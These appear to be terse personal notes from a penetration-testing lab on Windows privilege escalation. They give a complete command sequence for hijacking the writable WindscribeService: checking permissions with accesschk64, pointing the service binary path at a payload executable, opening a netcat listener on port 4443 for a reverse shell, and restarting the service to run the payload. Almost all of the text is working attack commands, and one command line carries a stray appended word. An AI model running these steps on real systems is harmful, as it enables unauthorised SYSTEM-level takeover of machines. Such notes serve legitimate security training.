(checklist)

- port scan
- version scan
- service scan

COMMANDS:
C:\Users\user\Desktop\Tools\accesschk64.exe -uwcv user *
 - RW WindscribeService SERVICE_ALL_ACCESS

sc qc WindscribeServicequit
 - BINARY_PATH_NAME   : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

Change the path to our payload:
sc config WindscribeService binpath= "C:\Users\user\Downloads\usp_payload.exe"

Verify the change:
sc qc WindscribeService

Setup listener: usp_payload uses port 4443 per our first config payload
nc -nlvp 4443

Restart service:
sc stop WindscribeService
sc query WindscribeService
sc start WindscribeService

go back to listening terminal